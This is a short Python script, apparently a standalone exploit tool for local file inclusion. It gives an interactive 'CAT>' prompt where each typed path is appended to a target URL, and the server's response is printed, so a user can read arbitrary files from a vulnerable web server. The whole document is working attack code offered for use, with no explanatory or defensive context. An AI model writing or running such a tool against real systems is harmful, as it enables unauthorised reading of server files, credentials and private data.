#!/usr/bin/env python3

import requests
import sys
import os

def exploit_lfi(url):
    while True:
        command = input('CAT> ')
        if command.lower() == 'exit':
            break
        elif command.lower() == 'clear':
            os.system('clear')
            continue
        full_url = f'{url}/{command}'
        response = requests.get(full_url)
        print(response.text)

if __name__ == '__main__':
    os.system('clear')
    url = sys.argv[1]
    exploit_lfi(url)

